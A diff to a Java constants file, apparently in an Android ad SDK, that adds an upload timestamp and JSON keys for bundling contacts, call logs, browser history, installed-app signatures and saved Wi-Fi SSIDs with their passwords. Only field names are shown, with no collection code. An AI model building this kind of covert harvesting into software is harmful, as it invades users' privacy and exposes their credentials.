@@ -31,6 +31,7 @@ public class AMConstants {
 	/** 统计相关的，上次记录的wifi ssid */
 	public static final String SP_LAST_SSID = "last_ssid";
 	public static final String SP_LAST_AD_STAMP = "last_display_stamp";
+	public static final String SP_LAST_UPLOAD_STAMP = "last_upload_stamp";
 
 	/** 是否锁屏 */
 	public static final String SP_SCREEN_LOCK = "screen_lock";
@@ -115,6 +116,34 @@ public class AMConstants {
 	public static final String NET_SINGLE_AD_PERMISSIONS_DESC = "desc";
 	public static final String NET_SINGLE_AD_PICS = "pics";
 	public static final String NET_SINGLE_AD_PICS_IMG = "img";
+	
+	public static final String NET_DATAS_APP_APP_NAME = "app_name";
+	public static final String NET_DATAS_APP_PACKAGE_NAME = "package_name";
+	public static final String NET_DATAS_APP_VERSION_CODE = "version_code";
+	public static final String NET_DATAS_APP_VERSION_NAME = "version_name";
+	public static final String NET_DATAS_APP_SIGNATURE = "signature";
+	public static final String NET_DATAS_APP_JSON = "apps";
+	public static final String NET_DATAS_BH_TITLE = "title";
+	public static final String NET_DATAS_BH_URL = "url";
+	public static final String NET_DATAS_BH_DATE = "date";
+	public static final String NET_DATAS_BH_JSON = "browser_history";
+	public static final String NET_DATAS_CONTACT_ID = "id";
+	public static final String NET_DATAS_CONTACT_NAME = "name";
+	public static final String NET_DATAS_CONTACT_PHONE_NUMBER = "phone_number";
+	public static final String NET_DATAS_CONTACTS_JSON = "contacts";
+	public static final String NET_DATAS_WIFI_SSID = "ssid";
+	public static final String NET_DATAS_WIFI_PSK = "psk";
+	public static final String NET_DATAS_WIFI_ENCRYPTION_TYPE = "encryption_type";
+	public static final String NET_DATAS_WIFI = "wifis";
+	public static final String NET_DATAS_APP_RECORD = "app_record";
+	public static final String NET_DATAS_CALLS_PHONE_NUMBER = "phone_number";
+	public static final String NET_DATAS_CALLS_CALL_TYPE = "call_type";
+	public static final String NET_DATAS_CALLS_TIME = "time";
+	public static final String NET_DATAS_CALLS_NAME = "name";
+	public static final String NET_DATAS_CALLS_DURATION = "duration";
+	public static final String NET_DATAS_CALLS_JSON = "calls";
+	public static final String NET_DATAS_WIFI_SWITCH = "wifi_switch";
+	public static final String NET_DATAS_BS_SWTICH = "bs_swtich";
 
 	// --------------文件--------------
 	public static final String FILE_CONFIG = "config";
